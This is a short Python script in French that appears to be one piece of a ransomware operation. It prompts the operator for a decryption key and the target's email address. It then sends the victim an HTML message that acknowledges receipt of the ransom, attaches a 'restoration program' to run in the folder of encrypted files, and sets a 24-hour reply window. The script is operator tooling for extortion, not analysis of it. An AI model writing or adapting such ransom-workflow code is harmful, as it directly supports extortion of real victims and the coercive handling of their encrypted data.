from mail_sender import envoyer_mail

cle_decryptage = input("Clé de déchiffrement (hexadécimal): ")

body= f"""
<html>
    <body>
        <h2>Vos fichiers sont prêts à être restaurés</h2>
        <p>Nous avons bien reçu votre paiement. Voici les étapes pour restaurer vos fichiers :</p>
        <ol>
            <li>Téléchargez le programme de restauration à l'aide du lien suivant :
                <a href="cid:attached_file"  target="_blank">Télécharger le programme de restauration</a>
            </li>
            <li>Exécutez le programme dans le dossier contenant vos fichiers chiffrés.</li>
            <li>Lorsqu'il vous est demandé, entrez la clé de déchiffrement suivante :</li>
        </ol>
        <p><strong>Clé de déchiffrement : {cle_decryptage}</strong></p>
        <p><em>Note : Assurez-vous d'utiliser cette clé uniquement avec le programme fourni. Toute tentative de décryptage non autorisée pourrait endommager vos fichiers.</em></p>
        <hr>
        <p>Si vous rencontrez des problèmes, répondez à cet email dans les 24 heures.</p>
    </body>
</html>
"""

email_cible = input("Entrez l'email de la cible : ")
envoyer_mail(email_cible, "Restaurez vos fichiers - Instructions et clé de décryptage", body, "restorer_ware.py")